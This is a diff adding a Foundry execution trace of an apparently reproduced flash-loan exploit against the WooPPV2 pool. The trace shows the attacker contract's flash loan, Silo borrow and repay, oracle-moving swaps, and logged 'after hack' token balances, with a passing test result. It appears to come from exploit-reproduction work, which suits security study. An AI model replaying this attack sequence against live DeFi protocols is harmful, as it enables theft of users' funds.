+    │   │   │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062], value: 926342 [9.263e5])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [30902] WooPPV2::swap(USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b], 926342 [9.263e5], 0, Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   │   ├─ [1296] USDCe::balanceOf(WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 1802276448867 [1.802e12]
+    │   │   │   │   │   │   │   └─ ← [Return] 1802276448867 [1.802e12]
+    │   │   │   │   │   │   ├─ [2227] WooracleV2::state(WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] State({ price: 9, spread: 5560000000000000 [5.56e15], coeff: 110000000000 [1.1e11], woFeasible: true })
+    │   │   │   │   │   │   ├─ [689] WooracleV2::decimals(WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000008
+    │   │   │   │   │   │   ├─ [1121] USDCe::decimals() [staticcall]
+    │   │   │   │   │   │   │   ├─ [381] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::decimals() [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 6
+    │   │   │   │   │   │   │   └─ ← [Return] 6
+    │   │   │   │   │   │   ├─ [1635] WOO::decimals() [staticcall]
+    │   │   │   │   │   │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
+    │   │   │   │   │   │   │   ├─ [501] 0x3f770Ac673856F105b586bb393d122721265aD46::decimals() [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   ├─ [1270] WooracleV2::postPrice(WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b], 9)
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [4527] WOO::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10232908094389174718777777 [1.023e25])
+    │   │   │   │   │   │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
+    │   │   │   │   │   │   │   ├─ [3387] 0x3f770Ac673856F105b586bb393d122721265aD46::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10232908094389174718777777 [1.023e25]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: WooPPV2: [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10232908094389174718777777 [1.023e25])
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─  emit topic 0: 0x0e8e403c2d36126272b08c75823e988381d9dc47f2f0a9a080d95f891d95c469
+    │   │   │   │   │   │   │        topic 1: 0x000000000000000000000000ff970a61a04b1ca14834a43f5de4533ebddb5cc8
+    │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000cafcd85d8ca7ad1e1c6f82f651fa15e33aefd07b
+    │   │   │   │   │   │   │        topic 3: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000000e22860000000000000000000000000000000000000000000876e70f30d8440f7149b10000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000e228600000000000000000000000000000000000000000000000000000000000000e7
+    │   │   │   │   │   │   └─ ← [Return] 10232908094389174718777777 [1.023e25]
+    │   │   │   │   │   ├─ [29303] Silo::repay(WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   │   ├─ [1301] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::isSiloPaused(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   ├─ [579] 0x602dB6e46B41bc2B9e2c6b3F8594C49CF8B8857D::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 5083902323623058456015968 [5.083e24]
+    │   │   │   │   │   │   ├─ [349] 0x602dB6e46B41bc2B9e2c6b3F8594C49CF8B8857D::totalSupply() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 5220006534884979612820252 [5.22e24]
+    │   │   │   │   │   │   ├─ emit Repay(param0: WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b], param1: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 5092663209802375827262436 [5.092e24])
+    │   │   │   │   │   │   ├─ [7271] WOO::transferFrom(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], 5092663209802375827262436 [5.092e24])
+    │   │   │   │   │   │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
+    │   │   │   │   │   │   │   ├─ [6128] 0x3f770Ac673856F105b586bb393d122721265aD46::transferFrom(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], 5092663209802375827262436 [5.092e24]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], value: 5092663209802375827262436 [5.092e24])
+    │   │   │   │   │   │   │   │   ├─ emit Approval(owner: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], value: 115792089237316195423570985008687907853269984665640558946794374205537302377499 [1.157e77])
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [8819] 0x602dB6e46B41bc2B9e2c6b3F8594C49CF8B8857D::burn(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5083902323623058456015968 [5.083e24])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 5083902323623058456015968 [5.083e24])
+    │   │   │   │   │   │   │   ├─ [305] Silo::siloRepository() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000008658047e48cc09161f4152c79155dac1d710ff0a
+    │   │   │   │   │   │   │   ├─ [642] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::getNotificationReceiver(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000d592f705bdc8c1b439bd4d665ed99c4faad5a680
+    │   │   │   │   │   │   │   ├─ [767] 0xd592F705bDC8C1B439Bd4D665Ed99C4FaAd5A680::onAfterTransfer(0x602dB6e46B41bc2B9e2c6b3F8594C49CF8B8857D, Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000, 5083902323623058456015968 [5.083e24])
+    │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   ├─ emit NotificationSent(param0: 0xd592F705bDC8C1B439Bd4D665Ed99C4FaAd5A680, param1: true)
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   └─ ← [Return] 5092663209802375827262436 [5.092e24], 5083902323623058456015968 [5.083e24]
+    │   │   │   │   │   ├─ [81991] Silo::withdraw(USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77], true)
+    │   │   │   │   │   │   ├─ [1301] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::isSiloPaused(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   ├─ [579] 0xF1A6fa898964b0DE464b19f3496d9145Fc7C4124::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 7000000000000 [7e12]
+    │   │   │   │   │   │   ├─ [349] 0xF1A6fa898964b0DE464b19f3496d9145Fc7C4124::totalSupply() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 7000000000000 [7e12]
+    │   │   │   │   │   │   ├─ [8875] 0xF1A6fa898964b0DE464b19f3496d9145Fc7C4124::burn(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7000000000000 [7e12])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 7000000000000 [7e12])
+    │   │   │   │   │   │   │   ├─ [305] Silo::siloRepository() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000008658047e48cc09161f4152c79155dac1d710ff0a
+    │   │   │   │   │   │   │   ├─ [642] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::getNotificationReceiver(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000d592f705bdc8c1b439bd4d665ed99c4faad5a680
+    │   │   │   │   │   │   │   ├─ [767] 0xd592F705bDC8C1B439Bd4D665Ed99C4FaAd5A680::onAfterTransfer(0xF1A6fa898964b0DE464b19f3496d9145Fc7C4124, Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000, 7000000000000 [7e12])
+    │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   ├─ emit NotificationSent(param0: 0xd592F705bDC8C1B439Bd4D665Ed99C4FaAd5A680, param1: true)
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [4697] USDCe::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7000000000000 [7e12])
+    │   │   │   │   │   │   │   ├─ [3951] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7000000000000 [7e12]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 7000000000000 [7e12])
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [872] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::getInterestRateModel(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000374d79ef2a75d5d25a4ce163d85ab0b579171d6c
+    │   │   │   │   │   │   ├─ [12503] 0x374D79ef2A75d5D25A4Ce163D85AB0b579171d6c::getCompoundInterestRate(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b], 1709653326 [1.709e9]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [1163] Silo::utilizationData(WOO: [0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07b]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000004534860aaf68cfd315ac7000000000000000000000000000000000000000000001cdef04d13e27c7a58c70000000000000000000000000000000000000000000000000000000065e73d4e
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   ├─ [579] 0x602dB6e46B41bc2B9e2c6b3F8594C49CF8B8857D::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ [872] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::getInterestRateModel(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000374d79ef2a75d5d25a4ce163d85ab0b579171d6c
+    │   │   │   │   │   │   ├─ [12885] 0x374D79ef2A75d5D25A4Ce163D85AB0b579171d6c::getCompoundInterestRate(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], 1709653326 [1.709e9]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [1163] Silo::utilizationData(WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000002a186545fb83e163f000000000000000000000000000000000000000000000000012de6cdf88fc86a0000000000000000000000000000000000000000000000000000000065e6a597
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000293e09aa9f
+    │   │   │   │   │   │   ├─ [579] 0xf13a33bd14D05B869B8f97095b63cae84d573852::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ [872] 0x8658047e48CC09161f4152c79155Dac1d710Ff0a::getInterestRateModel(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000374d79ef2a75d5d25a4ce163d85ab0b579171d6c
+    │   │   │   │   │   │   ├─ [12709] 0x374D79ef2A75d5D25A4Ce163D85AB0b579171d6c::getCompoundInterestRate(Silo: [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F], USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], 1709653326 [1.709e9]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [1163] Silo::utilizationData(USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000b79aa4eb400000000000000000000000000000000000000000000000000000006e401a08f70000000000000000000000000000000000000000000000000000000065e73d4e
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   ├─ [579] 0xDa3abf6F119E2D573e9a56E9679c0f87D4547799::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ emit Withdraw(param0: USDCe: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], param1: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param3: 7000000000000 [7e12], param4: true)
+    │   │   │   │   │   │   └─ ← [Return] 7000000000000 [7e12], 7000000000000 [7e12]
+    │   │   │   │   │   ├─ [4527] WOO::transfer(LBT: [0xB87495219C432fc85161e4283DfF131692A528BD], 2704571537527334874193677 [2.704e24])
+    │   │   │   │   │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
+    │   │   │   │   │   │   ├─ [3387] 0x3f770Ac673856F105b586bb393d122721265aD46::transfer(LBT: [0xB87495219C432fc85161e4283DfF131692A528BD], 2704571537527334874193677 [2.704e24]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: LBT: [0xB87495219C432fc85161e4283DfF131692A528BD], value: 2704571537527334874193677 [2.704e24])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] 0xab5c473bce5960a8292e9c8db82f9272504caab4e9ef09553fc112f82b62a3c2
+    │   │   │   │   ├─ [3296] WETH::balanceOf(LBT: [0xB87495219C432fc85161e4283DfF131692A528BD]) [staticcall]
+    │   │   │   │   │   ├─ [2553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(LBT: [0xB87495219C432fc85161e4283DfF131692A528BD]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 154927945956748531302 [1.549e20]
+    │   │   │   │   │   └─ ← [Return] 154927945956748531302 [1.549e20]
+    │   │   │   │   ├─ [1602] WOO::balanceOf(LBT: [0xB87495219C432fc85161e4283DfF131692A528BD]) [staticcall]
+    │   │   │   │   │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
+    │   │   │   │   │   ├─ [465] 0x3f770Ac673856F105b586bb393d122721265aD46::balanceOf(LBT: [0xB87495219C432fc85161e4283DfF131692A528BD]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 2704571537527334874193777 [2.704e24]
+    │   │   │   │   │   └─ ← [Return] 2704571537527334874193777 [2.704e24]
+    │   │   │   │   ├─ emit FlashLoan(param0: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 8385079 [8.385e6], param3: 0x000000000000000000000000000000000000000000023cb6623e110c5808cb69, param4: 0x000000000000000000000000000000000000000000000000bbaa99ecda4053a4, param5: 0x0000000000000000000000000000000000000000000000002588852f5ed9aa54)
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Return]
+    │   │   ├─ [4697] USDCe::transfer(Univ3pool: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443], 10581734799301 [1.058e13])
+    │   │   │   ├─ [3951] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transfer(Univ3pool: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443], 10581734799301 [1.058e13]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Univ3pool: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443], value: 10581734799301 [1.058e13])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [1296] WETH::balanceOf(Univ3pool: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [staticcall]
+    │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(Univ3pool: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [delegatecall]
+    │   │   │   └─ ← [Return] 432042397152000341752 [4.32e20]
+    │   │   └─ ← [Return] 432042397152000341752 [4.32e20]
+    │   ├─ [1296] USDCe::balanceOf(Univ3pool: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [staticcall]
+    │   │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(Univ3pool: [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443]) [delegatecall]
+    │   │   │   └─ ← [Return] 10591734799301 [1.059e13]
+    │   │   └─ ← [Return] 10591734799301 [1.059e13]
+    │   ├─ emit Flash(sender: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], recipient: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], qty0: 0, qty1: 10576446576012 [1.057e13], paid0: 0, paid1: 5288223289 [5.288e9])
+    │   └─ ← [Stop]
+    ├─ [1296] USDCe::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 141603536376 [1.416e11]
+    │   └─ ← [Return] 141603536376 [1.416e11]
+    ├─ [0] console::log("USDCe after hack: %s", 141603536376 [1.416e11]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [1602] WOO::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [337] 0xE72ba9418b5f2Ce0A6a40501Fe77c6839Aa37333::implementation() [staticcall]
+    │   │   └─ ← [Return] 0x3f770Ac673856F105b586bb393d122721265aD46
+    │   ├─ [465] 0x3f770Ac673856F105b586bb393d122721265aD46::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 2549710367944099228835575 [2.549e24]
+    │   └─ ← [Return] 2549710367944099228835575 [2.549e24]
+    ├─ [0] console::log("WOO after hack: %s", 2549710367944099228835575 [2.549e24]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [1296] WETH::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 522295261244159469020 [5.222e20]
+    │   └─ ← [Return] 522295261244159469020 [5.222e20]
+    ├─ [0] console::log("WETH after hack: %s", 522295261244159469020 [5.222e20]) [staticcall]
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.38s (13.74ms CPU time)
+
+Ran 1 test suite in 1.39s (1.38s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
